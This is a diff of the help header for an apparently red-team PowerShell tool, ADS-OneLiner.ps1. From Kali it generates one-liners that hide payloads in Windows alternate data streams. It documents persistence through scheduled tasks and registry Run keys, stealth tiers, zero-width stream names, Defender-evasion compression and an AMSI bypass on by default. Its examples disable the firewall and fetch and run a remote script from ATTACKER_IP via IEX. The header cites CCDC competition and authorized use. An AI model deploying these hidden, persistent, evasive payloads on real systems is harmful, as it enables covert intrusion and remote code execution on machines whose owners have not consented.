@@ -1,70 +1,165 @@
 <#
 .SYNOPSIS
-    ADS-OneLiner.ps1 - Minimal Command Generator for Windows Targets
+    ADS-OneLiner.ps1 — Minimal Command Generator for Windows Targets
 
 .DESCRIPTION
-    Runs on Linux (Kali) to generate minimal PowerShell commands for Windows deployment.
+    Runs on Linux (Kali) to generate minimal PowerShell deployment commands for Windows.
     Calls ADS-Dropper.ps1 internally to compute configuration, then outputs only the
     essential commands needed on the Windows target.
 
-    NO full script upload needed - just copy/paste the generated commands.
+    NO full script upload needed — just copy/paste the generated one-liner.
+
+    Workflow:
+      1. Run this script on Kali with your payload and options.
+      2. The script writes a deployment file (default: ads-payload.txt).
+      3. Paste OPTION 1 (base64 one-liner) into PowerShell on the Windows target.
+      4. Done. ADS created, task/registry persistence installed.
+
+    Output file sections:
+      CONFIGURATION SUMMARY   — Verify settings before deploying
+      OPTION 1: Base64        — Paste this on Windows (the one-liner)
+      OPTION 2: Readable      — Human-readable version for debugging
+      CLEANUP                 — Commands to remove all artifacts
 
 .PARAMETER Payload
-    Payload content (required unless -PayloadFile or -PayloadAtDeployment).
-    WARNING: Passing payloads containing $ variables via -Payload on the command
-    line is unreliable because bash and pwsh both expand $ in double-quoted strings.
-    Use -PayloadFile instead for payloads containing $ variables.
+    Payload content. Required unless -PayloadFile or -PayloadAtDeployment.
+    WARNING: Payloads with $ variables will be shell-expanded in double-quoted strings.
+    Use single quotes in bash, or use -PayloadFile for multi-line / complex payloads.
 
 .PARAMETER PayloadFile
-    Path to a file containing the payload. The file is read verbatim with
-    Get-Content -Raw, bypassing all shell expansion issues. This is the
-    RECOMMENDED way to pass payloads containing $ variables, registry paths,
-    or any other special characters.
+    Path to a file containing the payload. Read verbatim with Get-Content -Raw.
+    RECOMMENDED for payloads containing $variables, registry paths, or special chars.
+    Example: pwsh ADS-OneLiner.ps1 -PayloadFile ./ops/payloads/my-payload.ps1
 
 .PARAMETER PayloadAtDeployment
-    Prompt for payload on Windows target instead of baking it in
+    Prompt for payload on the Windows target instead of baking it in at generation time.
 
-.PARAMETER ZeroWidthStreams
-    Enable zero-width Unicode stream names
+.PARAMETER Obfuscate
+    Stealth tier. The primary control dial. Default: Advanced
+      None     Fixed names (SystemOptimization task, SystemCache.dat). [TESTING ONLY]
+      Basic    Word-list randomized names, C:\ProgramData placement.   [Quick]
+      Advanced Randomized names + WER/Cache deep placement.            [DEFAULT / CCDC]
+      Paranoid Advanced + zero-width Unicode stream and task names.    [Max stealth]
 
-.PARAMETER ZeroWidthMode
-    'single', 'multi', or 'hybrid'
-
-.PARAMETER HybridPrefix
-    Prefix for hybrid mode (e.g., 'Zone.Identifier')
+    Tier-implied settings:
+      Advanced/Paranoid: Randomize=true, UseDeepPlacement=true, AttachToExisting=true
+      Paranoid only:     ZeroWidthStreams=true
 
 .PARAMETER Persist
-    'task', 'registry', or 'none'
+    Persistence method. Default: 'task'
+      task     Scheduled Task (admin required). JScript wrapper, no visible PS window.
+      registry Registry Run key (user or admin). HKCU + HKLM if admin.
+      none     No persistence. ADS written and executed once.
 
-.PARAMETER CreateDecoys
-    Number of decoy streams (0-10)
+.PARAMETER Trigger
+    When the scheduled task fires. Accepts an array. Default: @('AtLogOn','AtStartup')
+    Valid values: AtLogOn, AtStartup, OnIdle, OnUnlock
+    A periodic task (every -PeriodicMinutes minutes) is ALWAYS added regardless.
+    Example: -Trigger @('AtLogOn','AtStartup','OnUnlock')
+
+.PARAMETER PeriodicMinutes
+    How often the periodic task fires, in minutes. Range: 1-1440. Default: 5
+
+.PARAMETER JitterPercent
+    Randomize task timing by +/- this percentage. Range: 0-50. Default: 20
+    Example: 20% of 5min interval = actual fire time anywhere in 4-6 minute window.
+
+.PARAMETER InstanceCount
+    Deploy N independent copies with unique artifact names, paths, and task names.
+    Range: 1-20. Default: 1. Use 2-3 for redundancy in competition.
 
 .PARAMETER Encrypt
-    Enable DPAPI machine-bound encryption (Windows DPAPI LocalMachine scope)
+    DPAPI machine-bound encrypt the payload. Windows DPAPI LocalMachine scope +
+    Machine GUID as entropy. Decrypts only on the machine it was deployed to.
+    Forces compression (UseCompression) to hide the DPAPI compound from Defender.
+
+.PARAMETER UseCompression
+    DeflateStream compress the payload before base64 encoding. Default: $true
+    Reduces one-liner size by ~50%. Uses DeflateStream (not GZip) to avoid
+    Behavior:Win32/PShellCobStager.A detection. Forced on when -Encrypt is used.
 
 .PARAMETER Randomize
-    Randomize host file name
+    Randomize artifact names (file, stream, task). Implied by Advanced/Paranoid tier.
+
+.PARAMETER UseDeepPlacement
+    Place ADS host file in deep WER/Cache/Diagnosis directories. Implied by Advanced/Paranoid.
+
+.PARAMETER AttachToExisting
+    Attach ADS to an existing legitimate system file. Implied by Advanced/Paranoid.
+
+.PARAMETER ZeroWidthStreams
+    Use zero-width Unicode chars (U+200B, U+200C, U+FEFF) in ADS stream names.
+    Implied by Paranoid tier. Save the manifest — cleanup requires codepoints.
+
+.PARAMETER ZeroWidthMode
+    How ZW characters are applied. Default: 'single'
+      single  One zero-width char
+      multi   3-5 zero-width chars
+      hybrid  Visible prefix + zero-width suffix (e.g., Zone.Identifier[ZW])
+
+.PARAMETER HybridPrefix
+    Visible prefix for ZeroWidthMode hybrid (e.g., 'Zone.Identifier').
+
+.PARAMETER CreateDecoys
+    Number of benign decoy ADS streams to create alongside the payload. Range: 0-10.
 
 .PARAMETER OutputFile
-    Where to save generated commands (default: ads-payload.txt)
+    Where to save the generated deployment file. Default: ads-payload.txt
 
 .PARAMETER ManifestDir
-    Manifest directory on Linux (default: ./manifests)
+    Directory for the cleanup manifest on Linux. Default: ./manifests
 
 .PARAMETER NoAmsi
-    Opt out of AMSI bypass (bypass is ON by default)
+    Opt out of AMSI bypass injection. Bypass is ON by default. Almost never use this.
 
 .EXAMPLE
-    # Simple payload (no $ variables):
-    pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Test'" -Persist task
+    # Fastest possible — simple payload, Advanced stealth, task persistence:
+    pwsh src/ADS-OneLiner.ps1 -Payload 'cmd /c netsh advfirewall set allprofiles state off'
 
-    # Payload with $ variables — use -PayloadFile to avoid shell expansion:
-    pwsh ADS-OneLiner.ps1 -PayloadFile ./my-payload.ps1 -Persist task -ZeroWidthStreams
+.EXAMPLE
+    # Standard CCDC — payload from library file, registry persist, 3 instances:
+    pwsh src/ADS-OneLiner.ps1 \
+      -PayloadFile ops/payloads/ccdc-library.ps1 \
+      -Payload 'FW-002' \
+      -Persist registry \
+      -Obfuscate Advanced \
+      -InstanceCount 3 \
+      -OutputFile /tmp/fw-deploy.txt
+
+.EXAMPLE
+    # Meme payload — requires user session, use registry persist:
+    pwsh src/ADS-OneLiner.ps1 \
+      -Payload 'while($true){Set-Clipboard "Red Team Was Here";Start-Sleep 30}' \
+      -Persist registry \
+      -Obfuscate Basic \
+      -OutputFile /tmp/meme-clip.txt
+
+.EXAMPLE
+    # Max stealth — Paranoid tier, encrypted, multi-instance:
+    pwsh src/ADS-OneLiner.ps1 \
+      -PayloadFile /tmp/payload.ps1 \
+      -Obfuscate Paranoid \
+      -Encrypt \
+      -InstanceCount 2 \
+      -OutputFile /tmp/paranoid.txt
+    # IMPORTANT: Save ./manifests/ — zero-width streams cannot be cleaned without it.
+
+.EXAMPLE
+    # Payload with $ variables — always use -PayloadFile:
+    cat > /tmp/mypayload.ps1 << 'EOF'
+    $w = New-Object Net.WebClient
+    $w.DownloadString('http://ATTACKER_IP:8080/agent.ps1') | IEX
+    EOF
+    pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/mypayload.ps1 -Encrypt -OutputFile /tmp/c2.txt
 
 .NOTES
     Author: Qweary
-    Version: 2.4 (DeflateStream Evasion + Deep Placement Hardening)
+    Version: 2.4 (DeflateStream Evasion + Deep Placement + _wrapEC Registry Fix)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
+    Platform: Linux/Kali (pwsh). Output is deployed on Windows.
+
+    MITRE ATT&CK: T1564.004 (ADS), T1053.005 (Scheduled Task), T1547.001 (Registry Run)
+    Authorized use only. See docs/PROJECT-AUTHORIZATION.md.
 #>
 
 [CmdletBinding()]
